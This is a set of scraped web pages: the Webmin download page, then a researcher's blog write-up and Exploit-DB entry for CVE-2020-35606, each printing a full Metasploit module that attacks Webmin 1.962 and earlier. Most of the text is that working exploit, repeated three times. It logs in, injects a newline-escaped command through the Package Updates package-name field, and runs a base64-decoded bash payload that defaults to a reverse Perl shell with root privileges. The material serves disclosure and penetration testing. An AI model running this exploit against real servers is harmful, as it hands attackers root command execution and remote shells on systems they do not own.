=== Content from www.webmin.com_a5673ea7_20250119_121042.html ===


* [Download](https://webmin.com/download/ "Download")
* [Changelog](https://webmin.com/archives/ "Changelog")
* [FAQ](https://webmin.com/faq/ "FAQ")
* [Documentation](https://webmin.com/docs/ "Documentation")
* [Forum](https://forum.virtualmin.com/c/webmin/12 "Forum")
# Downloading and Installing

October 2, 2017 Â· 3 min Â· Jamie Cameron | [Suggest Changes](https://github.com/webmin/webmin.com/blob/main/content/download.md)Table of Contents

* [Repository](#repository)
  + [Setup](#setup)
  + [Install](#install)
    - [RHEL and derivatives](#rhel-and-derivatives)
    - [Debian and derivatives](#debian-and-derivatives)
  + [Access](#access)
* [Manual](#manual)
  + [Checksum Verification](#checksum-verification)
  + [Configure](#configure)
    - [RHEL and derivatives](#rhel-and-derivatives-1)
    - [Debian and derivatives](#debian-and-derivatives-1)
    - [Solaris](#solaris)
    - [FreeBSD and any other Linux installation from source](#freebsd-and-any-other-linux-installation-from-source)
* [Older Versions](#older-versions)
* [Standard Modules](#standard-modules)
* [Development Builds](#development-builds)
  + [Pre-release Builds](#pre-release-builds)
  + [Nightly Builds](#nightly-builds)
## Repository[#](#repository)

### Setup[#](#setup)

The simplest and best way to get [**Webmin**](https://webmin.com/about/) is to use automatic [**`webmin-setup-repos.sh`**](https://github.com/webmin/webmin/blob/master/webmin-setup-repos.sh) script to configure repositories on your **RHEL** or **Debian** derivative systems. It can be done in two easy steps:

```
curl -o webmin-setup-repos.sh https://raw.githubusercontent.com/webmin/webmin/master/webmin-setup-repos.sh
sh webmin-setup-repos.sh

```

This script will automatically setup our repository and install our GPG keys on your system, and provide **`webmin`** package for installation and easy upgrades in the future. The supported and tested systems are **Red Hat Enterprise Linux**, **Alma**, **Rocky**, **Oracle**, **CentOS Stream**, **Fedora** or **Debian**, **Ubuntu**, **Kali**.

### Install[#](#install)

If Webmin repository was setup using our **`webmin-setup-repos.sh`** as [described above](#setup) then Webmin can be installed as easy as:

#### RHEL and derivatives[#](#rhel-and-derivatives)

```
dnf install webmin

```
#### Debian and derivatives[#](#debian-and-derivatives)

```
apt-get install webmin --install-recommends

```
### Access[#](#access)

After successful Webmin installation, you can access its interface by entering **`https://<Your-Server-IP>:10000`** in your browser. Check that your firewall configuration allows access through port **10000**.

## Manual[#](#manual)

The latest full Webmin distribution is available in various package formats for download:

[**`rpm`**](https://www.webmin.com/download/rpm/webmin-current.rpm) â **Red Hat Enterprise Linux**, **Alma**, **Rocky**, **Oracle**, **CentOS Stream**, **Fedora**, **openSUSE**

[**`deb`**](https://www.webmin.com/download/deb/webmin-current.deb) â **Debian derivatives (Ubuntu, Kali, Parrot, Pop!, Lite, Devuan)**

[**`pkg`**](https://www.webmin.com/download/solaris-pkg/webmin-current.pkg.gz) â **Solaris**

[**`tar`**](https://www.webmin.com/download/webmin-current.tar.gz) â **FreeBSD** or any other Linux distribution

Â Â \* The minimal [**`tar`**](https://www.webmin.com/download/webmin-current-minimal.tar.gz) version of Webmin contains only the core API and programs, and a few modules required for its basic operation. Most modules and all themes have been left out, but can be easily added later. It can be useful if you only need some of the programs functionality, and don’t want to download the entire multi-megabyte package.

### Checksum Verification[#](#checksum-verification)

To verify that you have downloaded Webmin fully and correctly, you can use the command **`sha256sum`** on the downloaded file, and compare it against those listed below:

| File | SHA256 Checksum |
| --- | --- |
| webmin\_2.202\_all.deb | 3a67702b05bcf64a40140d8040f93431b4a5d9627d5ee25dbec748d0c09e443c |
| webmin-2.202-minimal.tar.gz | c740104f908d7f84192802ff65915b135e3ccd81c227ed69be5dff6a699db882 |
| webmin-2.202-1.noarch.rpm | a85534e5f12e89b366b763e583ee80d8ed850bb544f39c2a48c1818971d30214 |
| webmin-2.202-1.src.rpm | 26fa9d537ba04e4102266deec4c2773fabd7dc0cd3317bb41fdccaa62ebf788f |
| webmin-2.202.pkg.gz | 9a824252254f6a35ccd8c14d19f9a7c7e2502afa1bdf76f58198ad7891dcb044 |
| webmin-2.202.tar.gz | 4f1c467aeda0ded546e69f332c768665b6a0537d6a69e609221f9465121f775e |
| webmin-2.202.zip | ee9dec4a35a15dcb9f2a9bf9941c15a051f2c862495aa1c5c7554fd4177e2d7b |

### Configure[#](#configure)

If Webmin package was downloaded manually it can be installed:

#### RHEL and derivatives[#](#rhel-and-derivatives-1)

```
dnf install ./webmin-current.rpm

```
#### Debian and derivatives[#](#debian-and-derivatives-1)

```
apt-get install --install-recommends ./webmin-current.deb

```
#### Solaris[#](#solaris)

```
# The root user be switched from a role account to a normal account to logins to work
rolemod -K type=normal root
# Uncompress
gunzip webmin-current.pkg.gz
# Install
pkgadd -d webmin-current.pkg

```
#### FreeBSD and any other Linux installation from source[#](#freebsd-and-any-other-linux-installation-from-source)

```
# Change directory
cd /tmp
# Uncompress
gunzip webmin-current.tar.gz
tar xf webmin-current.tar.gz
cd webmin-current
# Install
./setup.sh /usr/local/webmin

```

If you installed it by specifying an installation directory parameter to **`setup.sh`** as the instructions above show, i.e. **`/usr/local/webmin`**, the original **`webmin-current`** directory can now be safely deleted.

The source package can be installed on any of the supported OS, such as **FreeBSD**, **macOS**, **HP/UX**, **AIX**, and all other flavors of Linux. However, if your system supports one of the other package formats like **`rpm`** or **`deb`** packages, it is *recommended* to install it from that type of package.

## Older Versions[#](#older-versions)

Older versions of Webmin can be downloaded from [Sourceforge](https://sourceforge.net/projects/webadmin/files/webmin/).

## Standard Modules[#](#standard-modules)

The standard modules that you may have deleted from Webmin on your system can be re-installed by downloading using [this](https://download.webmin.com/download/modules/) link.

## Development Builds[#](#development-builds)

There are development pre-release and nightly builds available for testing purposes only. These builds may be unstable or lack certain features. Use them at your own risk!

### Pre-release Builds[#](#pre-release-builds)

Pre-release builds can be found on [devel.webmin.com](https://download.webmin.com/devel/) page.

### Nightly Builds[#](#nightly-builds)

Nightly builds can be found on [builds.webmin.dev](https://builds.webmin.dev/) page.

© 1997 - 2024 [Webmin](https://webmin.com/about/#developers)

=== Content from pentest.com.tr_0b43473c_20250119_135233.html ===
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
def initialize(info = {})
super(update\_info(info,
'Name' => 'Webmin 1.962 - PU Escape Bypass - Remote Command Execution',
'Description' => %q(
This module exploits an arbitrary command execution vulnerability in Webmin
1.962 and lower versions. Any user authorized to the "Package Updates"
module can execute arbitrary commands with root privileges.
It emerged by circumventing the measure taken for CVE-2019-12840.
s/\\(-)|\\(.)/string/g; escape is not enough for prevention.
Therefore, since the package name variable is placed directly in the system command,
we can manipulate it using some escape characters that HTTP supports.
For example, we can escape control by dropping the command line down one line.
We can do this with "%0A" and "%0C" urlencoded row values.Also, for paylad to work correctly,
we must add double an ampersand(&&) to the end of the payload (%26%26)
),
'Author' => [
'AkkuS <Özkan Mustafa Akkuş>' # Vulnerability Discovery, MSF PoC module
],
'License' => MSF\_LICENSE,
'References' =>
[
['CVE', '2020-'],
['URL', 'https://www.pentest.com.tr/exploits/Webmin-1962-PU-Escape-Bypass-Remote-Command-Execution.html']
],
'Privileged' => true,
'Payload' =>
{
'DisableNops' => true,
'Space' => 512,
'Compat' =>
{
'PayloadType' => 'cmd'
}
},
'DefaultOptions' =>
{
'RPORT' => 10000,
'SSL' => false,
'PAYLOAD' => 'cmd/unix/reverse\_perl'
},
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Targets' => [['Webmin <= 1.962', {}]],
'DisclosureDate' => '2020-12-21',
'DefaultTarget' => 0)
)
register\_options [
OptString.new('USERNAME', [true, 'Webmin Username']),
OptString.new('PASSWORD', [true, 'Webmin Password']),
OptString.new('TARGETURI', [true, 'Base path for Webmin application', '/'])
]
end
def peer
"#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
end
def login
res = send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri, 'session\_login.cgi'),
'cookie' => 'testing=1', # it must be used for "Error - No cookies"
'vars\_post' => {
'page' => '',
'user' => datastore['USERNAME'],
'pass' => datastore['PASSWORD']
}
})
if res && res.code == 302 && res.get\_cookies =~ /sid=(\w+)/
return $1
end
return nil unless res
''
end
def check
cookie = login
return CheckCode::Detected if cookie == ''
return CheckCode::Unknown if cookie.nil?
vprint\_status('Attempting to execute...')
# check version
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, "sysinfo.cgi"),
'cookie' => "sid=#{cookie}",
'vars\_get' => { "xnavigation" => "1" }
})
if res && res.code == 302 && res.body
version = res.body.split("Webmin 1.")[1]
return CheckCode::Detected if version.nil?
version = version.split(" ")[0]
if version <= "962"
# check package update priv
res = send\_request\_cgi({
'uri' => normalize\_uri(target\_uri.path, "package-updates/"),
'cookie' => "sid=#{cookie}"
})
if res && res.code == 200 && res.body =~ /Software Package Update/
print\_status("NICE! #{datastore['USERNAME']} has the right to >>Package Update<<")
return CheckCode::Vulnerable
end
end
end
print\_error("#{datastore['USERNAME']} doesn't have the right to >>Package Update<<")
print\_status("Please try with another user account!")
CheckCode::Safe
end
def exploit
cookie = login
if cookie == '' || cookie.nil?
fail\_with(Failure::Unknown, 'Failed to retrieve session cookie')
end
print\_good("Session cookie: #{cookie}")
res = send\_request\_cgi(
'method' => 'POST',
'uri' => normalize\_uri(target\_uri, 'proc', 'index\_tree.cgi'),
'headers' => { 'Referer' => "#{peer}/sysinfo.cgi?xnavigation=1" },
'cookie' => "sid=#{cookie}"
)
unless res && res.code == 200
fail\_with(Failure::Unknown, 'Request failed')
end
print\_status("Attempting to execute the payload...")
run\_update(cookie)
end
def run\_update(cookie)
@b64p = Rex::Text.encode\_base64(payload.encoded)
perl\_payload = 'bash -c "{echo,' + "#{@b64p}" + '}|{base64,-d}|{bash,-i}"'
payload = Rex::Text.uri\_encode(perl\_payload)
res = send\_request\_cgi(
{
'method' => 'POST',
'cookie' => "sid=#{cookie}",
'ctype' => 'application/x-www-form-urlencoded',
'uri' => normalize\_uri(target\_uri.path, 'package-updates', 'update.cgi'),
'headers' =>
{
'Referer' => "#{peer}/package-updates/?xnavigation=1"
},
# new vector // bypass to backslash %0A%7C{}%26%26
'data' => "redir=%2E%2E%2Fsquid%2F&redirdesc=Squid%20Proxy%20Server&mode=new&u=squid34%0A%7C#{payload}%26%26"
# for CVE-2019-12840 #'data' => "u=acl%2Fapt&u=%20%7C%20#{payload}&ok\_top=Update+Selected+Packages"
})
end
end


=== Content from www.pentest.com.tr_df5b2ecf_20250119_135234.html ===

ââââââ âââ ââââââ ââââââ âââââââââââ
âââââââââââ âââââââ âââââââ âââââââââââ
âââââââââââââââ âââââââ âââ âââââââââââ
âââââââââââââââ âââââââ âââ âââââââââââ
âââ ââââââ ââââââ ââââââââââââââââââââ
âââ ââââââ ââââââ âââ âââââââ ââââââââ
"I know Hack and I believe in Hak. So...You have no chance :/"

* [Root](../index.html)
* [Blog](/blog/)
* [Pentest](/pentest/)
* [Whoami](/whoami/)
* [Exploits](/exploits/)

## EDB-ID: 49318

## CVE-2020-35606

21 Dec, 2020
â¢
EXPLOIT

- This vulnerability is bypassing the measure taken for CVE-2019-12840 and converting it into a new vector.
- Vendor did not fixed this vulnerability yet.
- [Exploit-DB Link](https://www.exploit-db.com/exploits/49318)
- [CVE-Mitre Link](https://nvd.nist.gov/vuln/detail/CVE-2020-35606)
- [Download webmin\_pu\_escape\_bypass\_rce.rb (Metasploit)](https://pentest.com.tr/blog/webmin_pu_escape_bypass_rce.rb)
This module exploits an arbitrary command execution vulnerability in Webmin 1.962 and lower versions. Any user authorized to the "Package Updates" module can execute arbitrary commands with root privileges. It emerged by circumventing the measure taken for CVE-2019-12840.
s/\\(-)|\\(.)/string/g; escape is not enough for prevention. Therefore, since the package name variable is placed directly in the system command, we can manipulate it using some escape characters that HTTP supports. For example, we can escape control by dropping the command line down one line. We can do this with "%0A" and "%0C" urlencoded row values.Also, for paylad to work correctly, we must add double an ampersand(&&) to the end of the payload (%26%26)
### Source Code Analysis and Vulnerability Discovery.

Let's start by examining the "update.cgi" where we send the HTTP request.![](../images/web-code-1.png)The "u" parameter goes through some operations by assigning it to the @pkgs variable in "update.cgi".![](../images/web-code-2.png)In line 125, the slash is extracted and the process continues. With a little test, we can see that the use of "/" is not wanted.![](../images/web-code-4.png)This can fix a potential "\" backslash on the syntax side.![](../images/web-code-3.png)We know that the functions in "update.cgi" are called from "package-updates-lib.pl". We can follow what "package\_install ()" can do here.# package\_install(package-name, [system], [new-install])
Install some package, either from an update system or from Webmin. Returns a list of updated package names. We can find this note.package\_install($p, $s, $in{'mode'} eq 'new');
$p is package-name for us. We'll focus on it.![](../images/web-code-5.png)$p going to be $name in package\_install() func. Our $name variable is sent to the "update\_system" control on line 321.![](../images/web-code-6.png)This function is defined in "software-lib.pl" for "$config{'package\_system'}-lib.pl".![](../images/web-code-7.png)The system command to be used for update is specified in this area. I perform the analysis on ubuntu, a debian based operating system, so "apt-get" will be used on my system. The system check has been done. We can go back to "package-updates-lib.pl".![](../images/web-code-8.png)According to the system detected in line 350, the function in the file "{'system'}- lib.pl" will be used. So my system will use "apt", the update\_system\_install() function on line 355 will find its correspondence in the "apt-lib.pl" file.![](../images/web-code-9.png)When "apt-lib.pl" is examined, you can see functions belonging to the function
update\_system\_install([package], [∈], [no-force]).![](../images/web-code-10.png)In this section, the command to be run on the system is prepared. Here in line 25, "\" backslash are placed in front of some special characters.This update took place on October 14, 2019 with update title "Don't escape safe symbols in packages names, in particular dashes andâ¦" The reason is CVE-2019-12840, which is the vulnerability I shared before.![](../images/web-code-11.png)[You can access it by clicking here.](https://github.com/webmin/webmin/commit/e122629c02e2bae8f06f2ce0c3f0bd7bb7ffc3f5#diff-adc54486ea3dd9ca0ec430f0fe8fec964e95ed42bd7a7adfaf26db43e9682d50)Precaution has been taken, but s/\\(-)|\\(.)/string/g; escape is not enough for this.
The package name is a variable to the HTTP request we make and does not enter any other control.Therefore, since the package name variable is placed directly in the system command, we can manipulate it using some escape characters that HTTP supports. For example, we can escape control by dropping the command line down one line. We can do this with "%0A" and "%0C" urlencoded row values. Let's analyze this situation in the live system.![](../images/web-code-12.png)User "akkus2" only has "Software Package Updates" privilege. It has no right to switch to the command line or do any other action.![](../images/web-code-13.png)We sent our required HTTP request. In this request we will see what is happening in the background by sending the "|" pipe symbol directly. I've also added an IP address and we'll see what to do for the symbol point "." too for example.![](../images/web-code-14.png)When we take a look at the command sent to the command line, we can see that the backslashes has been added for pipe and point. Therefore, we cannot edit to intervene in the command and run an extra system command. However, if we can jump to a sub-command line in the system, we can inject a new command maybe :) lets try...![](../images/web-code-15.png)I add "% 0A" before the pipe.![](../images/web-code-16.png)As you can see, the "ifconfig" was broken from the whole and processed directly in the sub-command line, so the backslash was bypassed. There are those who ask "So will a long payload to write to get the remote shell be a problem?"Bypass will not be valid for just one character. We're jump to sub line at the beginning of where we're already manipulating. Let's analyze this with an example.![](../images/web-code-17.png)To get reverse shell, I prepared a payload and sent it to the server.![](../images/web-code-18.png)As you can see, many characters in the payload have been escaped with a backslash.
But that won't matter. Also, for paylad to work correctly, we must add double an ampersand(&&) to the end of the payload (%26%26)![](../images/web-code-19.png)The payload we send will fall to the next line again and it will work fine.![](../images/web-code-20.png)At the end of this work, we bypassed the measure taken for CVE-2019-12840 vulnerability, now a new CVE must be obtained :)Below you can access the metasploit module I prepared for this vulnerability.
It is similar to the previous one. I just added a few required characters.![](../images/web-code-21.png)
## Webmin 1.962 - PU Escape Bypass - Remote Command Execution

```
##
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Webmin 1.962 - PU Escape Bypass - Remote Command Execution',
      'Description'    => %q(
        This module exploits an arbitrary command execution vulnerability in Webmin
        1.962 and lower versions. Any user authorized to the "Package Updates"
        module can execute arbitrary commands with root privileges.
        It emerged by circumventing the measure taken for CVE-2019-12840.
        s/\\(-)|\\(.)/string/g; escape is not enough for prevention.
        Therefore, since the package name variable is placed directly in the system command,
        we can manipulate it using some escape characters that HTTP supports.
        For example, we can escape control by dropping the command line down one line.
        We can do this with "%0A" and "%0C" urlencoded row values.Also, for paylad to work correctly,
        we must add double an ampersand(&&) to the end of the payload (%26%26)
      ),
      'Author'         => [
        'AkkuS <Ãzkan Mustafa AkkuÅ>' # Vulnerability Discovery, MSF PoC module
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2020-'],
          ['URL', 'https://www.pentest.com.tr/exploits/Webmin-1962-PU-Escape-Bypass-Remote-Command-Execution.html']
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 512,
          'Compat'      =>
            {
              'PayloadType' => 'cmd'
            }
        },
      'DefaultOptions' =>
        {
          'RPORT' => 10000,
          'SSL'   => false,
          'PAYLOAD' => 'cmd/unix/reverse_perl'
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [['Webmin <= 1.962', {}]],
      'DisclosureDate' => '2020-12-21',
      'DefaultTarget'  => 0)
    )
    register_options [
        OptString.new('USERNAME',  [true, 'Webmin Username']),
        OptString.new('PASSWORD',  [true, 'Webmin Password']),
        OptString.new('TARGETURI',  [true, 'Base path for Webmin application', '/'])
    ]
  end

  def peer
    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
  end

  def login
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri, 'session_login.cgi'),
      'cookie' => 'testing=1', # it must be used for "Error - No cookies"
      'vars_post' => {
        'page' => '',
        'user' => datastore['USERNAME'],
        'pass' => datastore['PASSWORD']
      }
    })

    if res && res.code == 302 && res.get_cookies =~ /sid=(\w+)/
      return $1
    end

    return nil unless res
    ''
  end

  def check
    cookie = login
    return CheckCode::Detected if cookie == ''
    return CheckCode::Unknown if cookie.nil?

    vprint_status('Attempting to execute...')
    # check version
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, "sysinfo.cgi"),
      'cookie'  => "sid=#{cookie}",
      'vars_get' => { "xnavigation" => "1" }
    })

    if res && res.code == 302 && res.body
      version = res.body.split("Webmin 1.")[1]
      return CheckCode::Detected if version.nil?
      version = version.split(" ")[0]
      if version <= "962"
        # check package update priv
        res = send_request_cgi({
          'uri'     => normalize_uri(target_uri.path, "package-updates/"),
          'cookie'  => "sid=#{cookie}"
        })

        if res && res.code == 200 && res.body =~ /Software Package Update/
          print_status("NICE! #{datastore['USERNAME']} has the right to >>Package Update<<")
          return CheckCode::Vulnerable
        end
      end
    end
    print_error("#{datastore['USERNAME']} doesn't have the right to >>Package Update<<")
    print_status("Please try with another user account!")
    CheckCode::Safe
  end

  def exploit
    cookie = login
    if cookie == '' || cookie.nil?
      fail_with(Failure::Unknown, 'Failed to retrieve session cookie')
    end
    print_good("Session cookie: #{cookie}")

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri, 'proc', 'index_tree.cgi'),
      'headers' => { 'Referer' => "#{peer}/sysinfo.cgi?xnavigation=1" },
      'cookie' => "sid=#{cookie}"
    )
    unless res && res.code == 200
      fail_with(Failure::Unknown, 'Request failed')
    end

    print_status("Attempting to execute the payload...")
    run_update(cookie)
  end

  def run_update(cookie)
    @b64p = Rex::Text.encode_base64(payload.encoded)
    perl_payload = 'bash -c "{echo,' + "#{@b64p}" + '}|{base64,-d}|{bash,-i}"'
    payload = Rex::Text.uri_encode(perl_payload)

    res = send_request_cgi(
      {
        'method' => 'POST',
        'cookie' => "sid=#{cookie}",
        'ctype'  => 'application/x-www-form-urlencoded',
        'uri' => normalize_uri(target_uri.path, 'package-updates', 'update.cgi'),
        'headers' =>
          {
            'Referer' => "#{peer}/package-updates/?xnavigation=1"
          },
        # new vector // bypass to backslash  %0A%7C{}%26%26
        'data' => "redir=%2E%2E%2Fsquid%2F&redirdesc=Squid%20Proxy%20Server&mode=new&u=squid34%0A%7C#{payload}%26%26"
        # for CVE-2019-12840 #'data' => "u=acl%2Fapt&u=%20%7C%20#{payload}&ok_top=Update+Selected+Packages"
      })
  end
end

```
![](../images/web-code-22.png)![](../images/web-code-23.png)

Please enable JavaScript to view the [comments powered by Disqus.](https://disqus.com/?ref_noscript)

Â© Copyright, 2017 | Sponsored by- [National Keep](https://nationalkeep.com)



=== Content from www.exploit-db.com_3d467423_20250119_135233.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)

#### EDB-ID:

###### 49318

#### CVE:

###### [2020-35606](https://nvd.nist.gov/vuln/detail/CVE-2020-35606)

---

**EDB Verified:**

#### Author:

###### [AkkuS](/?author=9483)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2020-12-22

---

**Vulnerable App:**

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Webmin 1.962 - Package Update Escape Bypass RCE (Metasploit)',
      'Description'    => %q(
        This module exploits an arbitrary command execution vulnerability in Webmin
        1.962 and lower versions. Any user authorized to the "Package Updates"
        module can execute arbitrary commands with root privileges.
        It emerged by circumventing the measure taken for CVE-2019-12840.
        s/\\(-)|\\(.)/string/g; escape is not enough for prevention.
        Therefore, since the package name variable is placed directly in the system command,
        we can manipulate it using some escape characters that HTTP supports.
        For example, we can escape control by dropping the command line down one line.
        We can do this with "%0A" and "%0C" urlencoded row values.Also, for paylad to work correctly,
        we must add double an ampersand(&&) to the end of the payload (%26%26)
      ),
      'Author'         => [
        'AkkuS <Özkan Mustafa Akkuş>' # Vulnerability Discovery, MSF PoC module
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', 'CVE-2020-35606'],
          ['URL', 'https://www.pentest.com.tr/exploits/Webmin-1962-PU-Escape-Bypass-Remote-Command-Execution.html']
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 512,
          'Compat'      =>
            {
              'PayloadType' => 'cmd'
            }
        },
      'DefaultOptions' =>
        {
          'RPORT' => 10000,
          'SSL'   => false,
          'PAYLOAD' => 'cmd/unix/reverse_perl'
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [['Webmin <= 1.962', {}]],
      'DisclosureDate' => '2020-12-21',
      'DefaultTarget'  => 0)
    )
    register_options [
        OptString.new('USERNAME',  [true, 'Webmin Username']),
        OptString.new('PASSWORD',  [true, 'Webmin Password']),
        OptString.new('TARGETURI',  [true, 'Base path for Webmin application', '/'])
    ]
  end

  def peer
    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
  end

  def login
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri, 'session_login.cgi'),
      'cookie' => 'testing=1', # it must be used for "Error - No cookies"
      'vars_post' => {
        'page' => '',
        'user' => datastore['USERNAME'],
        'pass' => datastore['PASSWORD']
      }
    })

    if res && res.code == 302 && res.get_cookies =~ /sid=(\w+)/
      return $1
    end

    return nil unless res
    ''
  end

  def check
    cookie = login
    return CheckCode::Detected if cookie == ''
    return CheckCode::Unknown if cookie.nil?

    vprint_status('Attempting to execute...')
    # check version
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, "sysinfo.cgi"),
      'cookie'  => "sid=#{cookie}",
      'vars_get' => { "xnavigation" => "1" }
    })

    if res && res.code == 302 && res.body
      version = res.body.split("Webmin 1.")[1]
      return CheckCode::Detected if version.nil?
      version = version.split(" ")[0]
      if version <= "962"
        # check package update priv
        res = send_request_cgi({
          'uri'     => normalize_uri(target_uri.path, "package-updates/"),
          'cookie'  => "sid=#{cookie}"
        })

        if res && res.code == 200 && res.body =~ /Software Package Update/
          print_status("NICE! #{datastore['USERNAME']} has the right to >>Package Update<<")
          return CheckCode::Vulnerable
        end
      end
    end
    print_error("#{datastore['USERNAME']} doesn't have the right to >>Package Update<<")
    print_status("Please try with another user account!")
    CheckCode::Safe
  end

  def exploit
    cookie = login
    if cookie == '' || cookie.nil?
      fail_with(Failure::Unknown, 'Failed to retrieve session cookie')
    end
    print_good("Session cookie: #{cookie}")

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri, 'proc', 'index_tree.cgi'),
      'headers' => { 'Referer' => "#{peer}/sysinfo.cgi?xnavigation=1" },
      'cookie' => "sid=#{cookie}"
    )
    unless res && res.code == 200
      fail_with(Failure::Unknown, 'Request failed')
    end

    print_status("Attempting to execute the payload...")
    run_update(cookie)
  end

  def run_update(cookie)
    @b64p = Rex::Text.encode_base64(payload.encoded)
    perl_payload = 'bash -c "{echo,' + "#{@b64p}" + '}|{base64,-d}|{bash,-i}"'
    payload = Rex::Text.uri_encode(perl_payload)

    res = send_request_cgi(
      {
        'method' => 'POST',
        'cookie' => "sid=#{cookie}",
        'ctype'  => 'application/x-www-form-urlencoded',
        'uri' => normalize_uri(target_uri.path, 'package-updates', 'update.cgi'),
        'headers' =>
          {
            'Referer' => "#{peer}/package-updates/?xnavigation=1"
          },
        # new vector // bypass to backslash  %0A%7C{}%26%26
        'data' => "redir=%2E%2E%2Fsquid%2F&redirdesc=Squid%20Proxy%20Server&mode=new&u=squid34%0A%7C#{payload}%26%26"
        # for CVE-2019-12840 #'data' => "u=acl%2Fapt&u=%20%7C%20#{payload}&ok_top=Update+Selected+Packages"
      })
  end
end

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

